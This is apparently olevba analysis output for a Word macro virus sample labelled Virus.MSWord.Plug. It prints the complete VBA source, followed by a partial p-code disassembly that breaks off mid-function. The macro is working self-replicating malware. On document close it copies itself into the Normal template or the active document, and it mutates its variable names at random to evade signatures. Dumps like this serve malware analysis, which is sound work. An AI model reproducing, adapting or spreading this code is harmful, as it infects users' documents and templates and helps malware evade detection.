olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Plug
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Plug - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'Pluginer
Private Sub Document_Close()
'1
 On Error Resume Next
 nphhua_ = "'Pluginer"
 Set vsbkwuj_ = NormalTemplate.VBProject.VBComponents(1).CodeModule
 Set wbyjntbp_ = ActiveDocument.VBProject.VBComponents(1).CodeModule
 Set hqqgh_ = MacroContainer
 If vsbkwuj_.lines(1, 1) = nphhua_ And wbyjntbp_.lines(1, 1) = nphhua_ Then
   If hqqgh_.Name = NormalTemplate Then
     Call CheckSubs(vsbkwuj_, wbyjntbp_)
    Else
     Call CheckSubs(wbyjntbp_, vsbkwuj_)
   End If
  Else
   If vsbkwuj_.lines(1, 1) = nphhua_ Then
     wbyjntbp_.DeleteLines 1, wbyjntbp_.countoflines
     vpzxfsz_ = mutate(vsbkwuj_.lines(1, vsbkwuj_.countoflines))
     wbyjntbp_.insertLines 1, vpzxfsz_
    Else
     vsbkwuj_.DeleteLines 1, vsbkwuj_.countoflines
     vpzxfsz_ = mutate(wbyjntbp_.lines(1, wbyjntbp_.countoflines))
     vsbkwuj_.insertLines 1, vpzxfsz_
   End If
 End If
End Sub
Private Sub CheckSubs(ncz_, aoccuh_)
'1
 On Error Resume Next
 Dim hj_(255), yzkh_(255), eqk_(255), siqf_(255), pcl_(255), gujhxqql_(255), os_(255), vaoxlrnn_(255)
 jkhbg_ = 1: bkjmemgq_ = 1: eyrnk_ = 0: ul_ = 0
 Do
  pvafbci_ = GetSubName(aoccuh_, bkjmemgq_, an_, ovcerl_, dsyn_)
  tk_ = GetSubName(ncz_, jkhbg_, mficp_, ycl_, wth_)
  If pvafbci_ <> "" Then
   eyrnk_ = eyrnk_ + 1: hj_(eyrnk_) = pvafbci_: eqk_(eyrnk_) = an_
   pcl_(eyrnk_) = ovcerl_: os_(eyrnk_) = dsyn_
  End If
  If tk_ <> "" Then
   ul_ = ul_ + 1: yzkh_(ul_) = tk_: siqf_(ul_) = mficp_
   gujhxqql_(ul_) = ycl_: vaoxlrnn_(ul_) = wth_
  End If
 Loop While pvafbci_ <> "" Or tk_ <> ""
 For gcaiuh_ = 1 To ul_
  mgi_ = 0
  For mf_ = 1 To eyrnk_
   If hj_(mf_) = yzkh_(gcaiuh_) Then
    mgi_ = 1
    If os_(mf_) < vaoxlrnn_(gcaiuh_) Then
     aoccuh_.DeleteLines eqk_(mf_), pcl_(mf_)
     aoccuh_.insertLines 2, ncz_.lines(siqf_(gcaiuh_), gujhxqql_(gcaiuh_))
    End If
   End If
  Next
  If mgi_ = 0 Then aoccuh_.insertLines 2, ncz_.lines(siqf_(gcaiuh_), gujhxqql_(gcaiuh_))
 Next
End Sub
Private Function GetSubName(aoccuh_, bkjmemgq_, an_, ovcerl_, dsyn_)
'1
 On Error Resume Next
 mgi_ = 0: an_ = 0: ovcerl_ = 0: ptyiocqk_ = "": dsyn_ = 0
 Do
  cyqjdmfz_ = aoccuh_.lines(bkjmemgq_, 1): gcaiuh_ = 1
  Do
   If gcaiuh_ <= Len(cyqjdmfz_) - 6 Then
    If UCase(Mid(cyqjdmfz_, gcaiuh_, 5)) = " SUB" + " " And (gcaiuh_ + 5) < Len(cyqjdmfz_) Then
     mgi_ = 1: gcaiuh_ = gcaiuh_ + 4
    End If
    If UCase(Right(cyqjdmfz_, 5)) = "D SU" + "B" Then mgi_ = 4: ovcerl_ = bkjmemgq_ - an_ + 1
   End If
   If gcaiuh_ <= Len(cyqjdmfz_) - 10 Then
    If UCase(Mid(cyqjdmfz_, gcaiuh_, 10)) = " FUNCTION" + " " And (gcaiuh_ + 9) < Len(cyqjdmfz_) Then
     mgi_ = 1: gcaiuh_ = gcaiuh_ + 9
    End If
    If UCase(Right(cyqjdmfz_, 10)) = "D FUNCTIO" + "N" Then mgi_ = 4: ovcerl_ = bkjmemgq_ - an_ + 1
   End If
   If mgi_ = 2 Then
    ptyiocqk_ = ptyiocqk_ + Mid(cyqjdmfz_, gcaiuh_, 1)
    If UCase(Mid(cyqjdmfz_, gcaiuh_ + 1, 1)) >= "A" And UCase(Mid(cyqjdmfz_, gcaiuh_ + 1, 1)) <= "Z" Then
      mgi_ = 2
     Else
      If Mid(cyqjdmfz_, gcaiuh_ + 1, 1) >= "0" And Mid(cyqjdmfz_, gcaiuh_ + 1, 1) <= "9" Then mgi_ = 2 Else mgi_ = 3
    End If
   End If
   If mgi_ = 1 Then an_ = bkjmemgq_: mgi_ = 2: dsyn_ = Val(Right(aoccuh_.lines(an_ + 1, 1), Len(aoccuh_.lines(an_ + 1, 1)) - 1))
   gcaiuh_ = gcaiuh_ + 1
  Loop While gcaiuh_ <= Len(cyqjdmfz_)
  If bkjmemgq_ > aoccuh_.countoflines Then mgi_ = 4
  bkjmemgq_ = bkjmemgq_ + 1
 Loop While mgi_ <> 4
 GetSubName = ptyiocqk_
End Function
Private Function mutate(ai_)
'1
 On Error Resume Next
 Dim xnkwv_(500), szimks_(500)
 kov_ = 0: gcaiuh_ = 1
 Do While gcaiuh_ <= Len(ai_)
  If Mid(ai_, gcaiuh_, 1) = Chr(95) Then
   mgi_ = CheckUp(Mid(ai_, gcaiuh_ + 1, 1))
   If mgi_ = 3 Then
    mf_ = gcaiuh_ - 1: lnfqm_ = ""
    Do
     lnfqm_ = Mid(ai_, mf_, 1) + lnfqm_
     mf_ = mf_ - 1
     xjhhdn_ = CheckUp(Mid(ai_, mf_, 1))
    Loop While xjhhdn_ = 2
    xjhhdn_ = 0
    For pjw_ = 1 To kov_
     If xnkwv_(pjw_) = lnfqm_ Then xjhhdn_ = 1
    Next
    If xjhhdn_ = 0 Then
     kov_ = kov_ + 1: xnkwv_(kov_) = lnfqm_
     ertpu_ = 0
     Do
      lnfqm_ = GetNR()
      For pjw_ = 1 To kov_
       If lnfqm_ = szimks_(pjw_) Then ertpu_ = 1
      Next
     Loop While ertpu_ <> 0
     szimks_(kov_) = lnfqm_
    End If
   End If
  End If
  gcaiuh_ = gcaiuh_ + 1
 Loop
 vfy_ = "": gcaiuh_ = 1
 Do While gcaiuh_ <= Len(ai_)
  If Mid(ai_, gcaiuh_, 1) = Chr(95) Then
   mgi_ = CheckUp(Mid(ai_, gcaiuh_ + 1, 1))
   If mgi_ = 3 Then
    mf_ = gcaiuh_ - 1: lnfqm_ = ""
    Do
     lnfqm_ = Mid(ai_, mf_, 1) + lnfqm_
     mf_ = mf_ - 1
     xjhhdn_ = CheckUp(Mid(ai_, mf_, 1))
    Loop While xjhhdn_ = 2
    For pjw_ = 1 To kov_
     If xnkwv_(pjw_) = lnfqm_ Then xjhhdn_ = pjw_
    Next
    mf_ = Len(vfy_)
    Do While CheckUp(Mid(vfy_, mf_, 1)) = 2
     mf_ = mf_ - 1
    Loop
    vfy_ = Left(vfy_, mf_) + szimks_(xjhhdn_)
   End If
  End If
  vfy_ = vfy_ + Mid(ai_, gcaiuh_, 1)
  gcaiuh_ = gcaiuh_ + 1
 Loop
 mutate = vfy_
End Function
Private Function CheckUp(cyqjdmfz_)
'1
 On Error Resume Next
 If UCase(Mid(cyqjdmfz_, gcaiuh_ + 1, 1)) >= "A" And UCase(Mid(cyqjdmfz_, gcaiuh_ + 1, 1)) <= "Z" Then
   mgi_ = 2
  Else
   If Mid(cyqjdmfz_, gcaiuh_ + 1, 1) >= "0" And Mid(cyqjdmfz_, gcaiuh_ + 1, 1) <= "9" Then mgi_ = 2 Else mgi_ = 3
 End If
 CheckUp = mgi_
End Function
Private Function GetNR()
'1
On Error Resume Next
 bu_ = ""
 For gcaiuh_ = 1 To Int(Rnd * 7) + 2
  bu_ = bu_ + Chr(97 + Int(Rnd * 26))
 Next
 GetNR = bu_
End Function
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Plug
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 10676 bytes
' Line #0:
' Line #1:
' 	QuoteRem 0x0000 0x0008 "Pluginer"
' Line #2:
' 	FuncDefn (Private Sub Document_Close())
' Line #3:
' 	QuoteRem 0x0000 0x0001 "1"
' Line #4:
' 	OnError (Resume Next) 
' Line #5:
' 	LitStr 0x0009 "'Pluginer"
' 	St nphhua_ 
' Line #6:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set vsbkwuj_ 
' Line #7:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set wbyjntbp_ 
' Line #8:
' 	SetStmt 
' 	Ld MacroContainer 
' 	Set hqqgh_ 
' Line #9:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld vsbkwuj_ 
' 	ArgsMemLd lines 0x0002 
' 	Ld nphhua_ 
' 	Eq 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld wbyjntbp_ 
' 	ArgsMemLd lines 0x0002 
' 	Ld nphhua_ 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #10:
' 	Ld hqqgh_ 
' 	MemLd New 
' 	Ld NormalTemplate 
' 	Eq 
' 	IfBlock 
' Line #11:
' 	Ld vsbkwuj_ 
' 	Ld wbyjntbp_ 
' 	ArgsCall (Call) CheckSubs 0x0002 
' Line #12:
' 	ElseBlock 
' Line #13:
' 	Ld wbyjntbp_ 
' 	Ld vsbkwuj_ 
' 	ArgsCall (Call) CheckSubs 0x0002 
' Line #14:
' 	EndIfBlock 
' Line #15:
' 	ElseBlock 
' Line #16:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld vsbkwuj_ 
' 	ArgsMemLd lines 0x0002 
' 	Ld nphhua_ 
' 	Eq 
' 	IfBlock 
' Line #17:
' 	LitDI2 0x0001 
' 	Ld wbyjntbp_ 
' 	MemLd countoflines 
' 	Ld wbyjntbp_ 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #18:
' 	LitDI2 0x0001 
' 	Ld vsbkwuj_ 
' 	MemLd countoflines 
' 	Ld vsbkwuj_ 
' 	ArgsMemLd lines 0x0002 
' 	ArgsLd mutate 0x0001 
' 	St vpzxfsz_ 
' Line #19:
' 	LitDI2 0x0001 
' 	Ld vpzxfsz_ 
' 	Ld wbyjntbp_ 
' 	ArgsMemCall insertLines 0x0002 
' Line #20:
' 	ElseBlock 
' Line #21:
' 	LitDI2 0x0001 
' 	Ld vsbkwuj_ 
' 	MemLd countoflines 
' 	Ld vsbkwuj_ 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #22:
' 	LitDI2 0x0001 
' 	Ld wbyjntbp_ 
' 	MemLd countoflines 
' 	Ld wbyjntbp_ 
' 	ArgsMemLd lines 0x0002 
' 	ArgsLd mutate 0x0001 
' 	St vpzxfsz_ 
' Line #23:
' 	LitDI2 0x0001 
' 	Ld vpzxfsz_ 
' 	Ld vsbkwuj_ 
' 	ArgsMemCall insertLines 0x0002 
' Line #24:
' 	EndIfBlock 
' Line #25:
' 	EndIfBlock 
' Line #26:
' 	EndSub 
' Line #27:
' 	FuncDefn (Private Sub CheckSubs(ncz_, aoccuh_))
' Line #28:
' 	QuoteRem 0x0000 0x0001 "1"
' Line #29:
' 	OnError (Resume Next) 
' Line #30:
' 	Dim 
' 	OptionBase 
' 	LitDI2 0x00FF 
' 	VarDefn hj_
' 	OptionBase 
' 	LitDI2 0x00FF 
' 	VarDefn yzkh_
' 	OptionBase 
' 	LitDI2 0x00FF 
' 	VarDefn eqk_
' 	OptionBase 
' 	LitDI2 0x00FF 
' 	VarDefn siqf_
' 	OptionBase 
' 	LitDI2 0x00FF 
' 	VarDefn pcl_
' 	OptionBase 
' 	LitDI2 0x00FF 
' 	VarDefn gujhxqql_
' 	OptionBase 
' 	LitDI2 0x00FF 
' 	VarDefn os_
' 	OptionBase 
' 	LitDI2 0x00FF 
' 	VarDefn vaoxlrnn_
' Line #31:
' 	LitDI2 0x0001 
' 	St jkhbg_ 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	St bkjmemgq_ 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	St eyrnk_ 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	St ul_ 
' Line #32:
' 	Do 
' Line #33:
' 	Ld aoccuh_ 
' 	Ld bkjmemgq_ 
' 	Ld an_ 
' 	Ld ovcerl_ 
' 	Ld dsyn_ 
' 	ArgsLd GetSubName 0x0005 
' 	St pvafbci_ 
' Line #34:
' 	Ld ncz_ 
' 	Ld jkhbg_ 
' 	Ld mficp_ 
' 	Ld ycl_ 
' 	Ld wth_ 
' 	ArgsLd GetSubName 0x0005 
' 	St tk_ 
' Line #35:
' 	Ld pvafbci_ 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #36:
' 	Ld eyrnk_ 
' 	LitDI2 0x0001 
' 	Add 
' 	St eyrnk_ 
' 	BoS 0x0000 
' 	Ld pvafbci_ 
' 	Ld eyrnk_ 
' 	ArgsSt hj_ 0x0001 
' 	BoS 0x0000 
' 	Ld an_ 
' 	Ld eyrnk_ 
' 	ArgsSt eqk_ 0x0001 
' Line #37:
' 	Ld ovcerl_ 
' 	Ld eyrnk_ 
' 	ArgsSt pcl_ 0x0001 
' 	BoS 0x0000 
' 	Ld dsyn_ 
' 	Ld eyrnk_ 
' 	ArgsSt os_ 0x0001 
' Line #38:
' 	EndIfBlock 
' Line #39:
' 	Ld tk_ 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #40:
' 	Ld ul_ 
' 	LitDI2 0x0001 
' 	Add 
' 	St ul_ 
' 	BoS 0x0000 
' 	Ld tk_ 
' 	Ld ul_ 
' 	ArgsSt yzkh_ 0x0001 
' 	BoS 0x0000 
' 	Ld mficp_ 
' 	Ld ul_ 
' 	ArgsSt siqf_ 0x0001 
' Line #41:
' 	Ld ycl_ 
' 	Ld ul_ 
' 	ArgsSt gujhxqql_ 0x0001 
' 	BoS 0x0000 
' 	Ld wth_ 
' 	Ld ul_ 
' 	ArgsSt vaoxlrnn_ 0x0001 
' Line #42:
' 	EndIfBlock 
' Line #43:
' 	Ld pvafbci_ 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Ld tk_ 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Or 
' 	LoopWhile 
' Line #44:
' 	StartForVariable 
' 	Ld gcaiuh_ 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ul_ 
' 	For 
' Line #45:
' 	LitDI2 0x0000 
' 	St mgi_ 
' Line #46:
' 	StartForVariable 
' 	Ld mf_ 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld eyrnk_ 
' 	For 
' Line #47:
' 	Ld mf_ 
' 	ArgsLd hj_ 0x0001 
' 	Ld gcaiuh_ 
' 	ArgsLd yzkh_ 0x0001 
' 	Eq 
' 	IfBlock 
' Line #48:
' 	LitDI2 0x0001 
' 	St mgi_ 
' Line #49:
' 	Ld mf_ 
' 	ArgsLd os_ 0x0001 
' 	Ld gcaiuh_ 
' 	ArgsLd vaoxlrnn_ 0x0001 
' 	Lt 
' 	IfBlock 
' Line #50:
' 	Ld mf_ 
' 	ArgsLd eqk_ 0x0001 
' 	Ld mf_ 
' 	ArgsLd pcl_ 0x0001 
' 	Ld aoccuh_ 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #51:
' 	LitDI2 0x0002 
' 	Ld gcaiuh_ 
' 	ArgsLd siqf_ 0x0001 
' 	Ld gcaiuh_ 
' 	ArgsLd gujhxqql_ 0x0001 
' 	Ld ncz_ 
' 	ArgsMemLd lines 0x0002 
' 	Ld aoccuh_ 
' 	ArgsMemCall insertLines 0x0002 
' Line #52:
' 	EndIfBlock 
' Line #53:
' 	EndIfBlock 
' Line #54:
' 	StartForVariable 
' 	Next 
' Line #55:
' 	Ld mgi_ 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0002 
' 	Ld gcaiuh_ 
' 	ArgsLd siqf_ 0x0001 
' 	Ld gcaiuh_ 
' 	ArgsLd gujhxqql_ 0x0001 
' 	Ld ncz_ 
' 	ArgsMemLd lines 0x0002 
' 	Ld aoccuh_ 
' 	ArgsMemCall insertLines 0x0002 
' 	EndIf 
' Line #56:
' 	StartForVariable 
' 	Next 
' Line #57:
' 	EndSub 
' Line #58:
' 	FuncDefn (Private Function GetSubName(aoccuh_, bkjmemgq_, an_, ovcerl_, dsyn_, id_FFFE As Variant))
' Line #59:
' 	QuoteRem 0x0000 0x0001 "1"
' Line #60:
' 	OnError (Resume Next) 
' Line #61:
' 	LitDI2 0x0000 
' 	St mgi_ 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	St an_ 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	St ovcerl_ 
' 	BoS 0x0000 
' 	LitStr 0x0000 ""
' 	St ptyiocqk_ 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	St dsyn_ 
' Line #62:
' 	Do 
' Line #63:
' 	Ld bkjmemgq_ 
' 	LitDI2 0x0001 
' 	Ld aoccuh_ 
' 	ArgsMemLd lines 0x0002 
' 	St cyqjdmfz_ 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	St gcaiuh_ 
' Line #64:
' 	Do 
' Line #65:
' 	Ld gcaiuh_ 
' 	Ld cyqjdmfz_ 
' 	FnLen 
' 	LitDI2 0x0006 
' 	Sub 
' 	Le 
' 	IfBlock 
' Line #66:
' 	Ld cyqjdmfz_ 
' 	Ld gcaiuh_ 
' 	LitDI2 0x0005 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0004 " SUB"
' 	LitStr 0x0001 " "
' 	Add 
' 	Eq 
' 	Ld gcaiuh_ 
' 	LitDI2 0x0005 
' 	Add 
' 	Paren 
' 	Ld cyqjdmfz_ 
' 	FnLen 
' 	Lt 
' 	And 
' 	IfBlock 
' Line #67:
' 	LitDI2 0x0001 
' 	St mgi_ 
' 	BoS 0x0000 
' 	Ld gcaiuh_ 
' 	LitDI2 0x0004 
' 	Add 
' 	St gcaiuh_ 
' Line #68:
' 	EndIfBlock 
' Line #69:
' 	Ld cyqjdmfz_ 
' 	LitDI2 0x0005 
' 	ArgsLd Right 0x0002 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0004 "D SU"
' 	LitStr 0x0001 "B"
' 	Add 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0004 
' 	St mgi_ 
' 	BoS 0x0000 
' 	Ld bkjmemgq_ 
' 	Ld an_ 
' 	Sub 
' 	LitDI2 0x0001 
' 	Add 
' 	St ovcerl_ 
' 	EndIf 
' Line #70:
' 	EndIfBlock 
' Line #71:
' 	Ld gcaiuh_ 
' 	Ld cyqjdmfz_ 
' 	FnLen 
' 	LitDI2 0x000A 
' 	Sub 
' 	Le 
' 	IfBlock 
' Line #72:
' 	Ld cyqjdmfz_ 
' 	Ld gcaiuh_ 
' 	LitDI2 0x000A 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0009 " FUNCTION"
' 	LitStr 0x0001 " "
' 	Add 
' 	Eq 
' 	Ld gcaiuh_ 
' 	LitDI2 0x0009 
' 	Add 
' 	Paren 
' 	Ld cyqjdmfz_ 
' 	FnLen 
' 	Lt 
' 	And 
' 	IfBlock 
' Line #73:
' 	LitDI2 0x0001 
' 	St mgi_ 
' 	BoS 0x0000 
' 	Ld gcaiuh_ 
' 	LitDI2 0x0009 
' 	Add 
' 	St gcaiuh_ 
' Line #74:
' 	EndIfBlock 
' Line #75:
' 	Ld cyqjdmfz_ 
' 	LitDI2 0x000A 
' 	ArgsLd Right 0x0002 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0009 "D FUNCTIO"
' 	LitStr 0x0001 "N"
' 	Add 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0004 
' 	St mgi_ 
' 	BoS 0x0000 
' 	Ld bkjmemgq_ 
' 	Ld an_ 
' 	Sub 
' 	LitDI2 0x0001 
' 	Add 
' 	St ovcerl_ 
' 	EndIf 
' Line #76:
' 	EndIfBlock 
' Line #77:
' 	Ld mgi_ 
' 	LitDI2 0x0002 
' 	Eq 
' 	IfBlock 
' Line #78:
' 	Ld ptyiocqk_ 
' 	Ld cyqjdmfz_ 
' 	Ld gcaiuh_ 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Add 
' 	St ptyiocqk_ 
' Line #79:
' 	Ld cyqjdmfz_ 
' 	Ld gcaiuh_ 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0001 "A"
' 	Ge 
' 	Ld cyqjdmfz_ 
' 	Ld gcaiuh_ 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0001 "Z"
' 	Le 
' 	And 
' 	IfBlock 
' Line #80:
' 	LitDI2 0x0002 
' 	St mgi_ 
' Line #81:
' 	ElseBlock 
' Line #82:
' 	Ld cyqjdmfz_ 
' 	Ld gcaiuh_ 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 "0"
' 	Ge 
' 	Ld cyqjdmfz_ 
' 	Ld gcaiuh_ 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 "9"
' 	Le 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0002 
' 	St mgi_ 
' 	Else 
' 	BoSImplicit 
' 	LitDI2 0x0003 
' 	St mgi_ 
' 	EndIf 
' Line #83:
' 	EndIfBlock 
' Line #84:
' 	EndIfBlock 
' Line #85:
' 	Ld mgi_ 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld bkjmemgq_ 
' 	St an_ 
' 	BoS 0x0000 
' 	LitDI2 0x0002 
' 	St mgi_ 
' 	BoS 0x0000 
' 	Ld an_ 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld aoccuh_ 
' 	ArgsMemLd lines 0x0002 
' 	Ld an_ 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld aoccuh_ 
' 	ArgsMemLd lines 0x0002 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd Right 0x0002 
' 	ArgsLd Val 0x0001 
' 	St dsyn_ 
' 	EndIf 
' Line #86:
' 	Ld gcaiuh_ 
' 	LitDI2 0x0001 
' 	Add 
' 	St gcaiuh_ 
' Line #87:
' 	Ld gcaiuh_ 
' 	Ld cyqjdmfz_ 
' 	FnLen 
' 	Le 
' 	LoopWhile 
' Line #88:
' 	Ld bkjmemgq_ 
' 	Ld aoccuh_ 
' 	MemLd countoflines 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0004 
' 	St mgi_ 
' 	EndIf 
' Line #89:
' 	Ld bkjmemgq_ 
' 	LitDI2 0x0001 
' 	Add 
' 	St bkjmemgq_ 
' Line #90:
' 	Ld mgi_ 
' 	LitDI2 0x0004 
' 	Ne 
' 	LoopWhile 
' Line #91:
' 	Ld ptyiocqk_ 
' 	St GetSubName 
' Line #92:
' 	EndFunc 
' Line #93:
' 	FuncDefn (Private Function mutate(ai_, id_FFFE As Variant))
' Line #94:
' 	QuoteRem 0x0000 0x0001 "1"
' Line #95:
' 	OnError (Resume Next) 
' Line #96:
' 	Dim 
' 	OptionBase 
' 	LitDI2 0x01F4 
' 	VarDefn xnkwv_
' 	OptionBase 
' 	LitDI2 0x01F4 
' 	VarDefn szimks_
' Line #97:
' 	LitDI2 0x0000 
' 	St kov_ 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	St gcaiuh_ 
' Line #98:
' 	Ld gcaiuh_ 
' 	Ld ai_ 
' 	FnLen 
' 	Le 
' 	DoWhile 
' Line #99:
' 	Ld ai_ 
' 	Ld gcaiuh_ 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x005F 
' 	ArgsLd Chr 0x0001 
' 	Eq 
' 	IfBlock 
' Line #100:
' 	Ld ai_ 
' 	Ld gcaiuh_ 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd CheckUp 0x0001 
' 	St mgi_ 
' Line #101:
' 	Ld mgi_ 
' 	LitDI2 0x0003 
' 	Eq 
' 	IfBlock 
' Line #102:
' 	Ld gcaiuh_ 
' 	LitDI2 0x0001 
' 	Sub 
' 	St mf_ 
' 	BoS 0x0000 
' 	LitStr 0x0000 ""
' 	St lnfqm_ 
' Line #103:
' 	Do 
' Line #104:
' 	Ld ai_ 
' 	Ld mf_ 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Ld lnfqm_ 
' 	Add 
' 	St lnfqm_ 
' Line #105:
' 	Ld mf_ 
' 	LitDI2 0x0001 
' 	Sub 
' 	St mf_ 
' Line #106:
' 	Ld ai_ 
' 	Ld mf_ 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd CheckUp 0x0001 
' 	St xjhhdn_ 
' Line #107:
' 	Ld xjhhdn_ 
' 	LitDI2 0x0002 
' 	Eq 
' 	LoopWhile 
' Line #108:
' 	LitDI2 0x0000 
' 	St xjhhdn_ 
' Line #109:
' 	StartForVariable 
' 	Ld pjw_ 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld kov_ 
' 	For 
' Line #110:
' 	Ld pjw_ 
' 	ArgsLd xnkwv_ 0x0001 
' 	Ld lnfqm_ 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St xjhhdn_ 
' 	EndIf 
' Line #111:
' 	StartForVariable 
' 	Next 
' Line #112:
' 	Ld xjhhdn_ 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #113:
' 	Ld kov_ 
' 	LitDI2 0x0001 
' 	Add 
' 	St kov_ 
' 	BoS 0x0000 
' 	Ld lnfqm_ 
' 	Ld kov_ 
' 	ArgsSt xnkwv_ 0x0001 
' Line #114:
' 	LitDI2 0x0000 
' 	St ertpu_ 
' Line #115:
' 	Do 
' Line #116:
' 	ArgsLd GetNR 0x0000 
' 	St lnfqm_ 
' Line #117:
' 	StartForVariable 
' 	Ld pjw_ 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld kov_ 
' 	For 
' Line #118:
' 	Ld lnfqm_ 
' 	Ld pjw_ 
' 	ArgsLd szimks_ 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St ertpu_ 
' 	EndIf 
' Line #119:
' 	StartForVariable 
' 	Next 
' Line #120:
' 	Ld ertpu_ 
' 	LitDI2 0x0000 
' 	Ne 
' 	LoopWhile 
' Line #121:
' 	Ld lnfqm_ 
' 	Ld kov_ 
' 	ArgsSt szimks_ 0x0001 
' Line #122:
' 	EndIfBlock 
' Line #123:
' 	EndIfBlock 
' Line #124:
' 	EndIfBlock 
' Line #125:
' 	Ld gcaiuh_ 
' 	LitDI2 0x0001 
' 	Add 
' 	St gcaiuh_ 
' Line #126:
' 	Loop 
' Line #127:
' 	LitStr 0x0000 ""
' 	St vfy_ 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	St gcaiuh_ 
' Line #128:
' 	Ld gcaiuh_ 
' 	Ld ai_ 
' 	FnLen 
' 	Le 
' 	DoWhile 
' Line #129:
' 	Ld ai_ 
' 	Ld gcaiuh_ 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x005F 
' 	ArgsLd Chr 0x0001 
' 	Eq 
' 	IfBlock 
' Line #130:
' 	Ld ai_ 
' 	Ld gcaiuh_ 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd CheckUp 0x0001 
' 	St mgi_ 
' Line #131:
' 	Ld mgi_ 
' 	LitDI2 0x0003 
' 	Eq 
' 	IfBlock 
' Line #132:
' 	Ld gcaiuh_ 
' 	LitDI2 0x0001 
' 	Sub 
' 	St mf_ 
' 	BoS 0x0000 
' 	LitStr 0x0000 ""
' 	St lnfqm_ 
' Line #133:
' 	Do 
' Line #134:
' 	Ld ai_ 
' 	Ld mf_ 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Ld lnfqm_ 
' 	Add 
' 	St lnfqm_ 
' Line #135:
' 	Ld mf_ 
' 	LitDI2 0x0001 
' 	Sub 
' 	St mf_ 
' Line #136:
' 	Ld ai_ 
' 	Ld mf_ 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd CheckUp 0x0001 
' 	St xjhhdn_ 
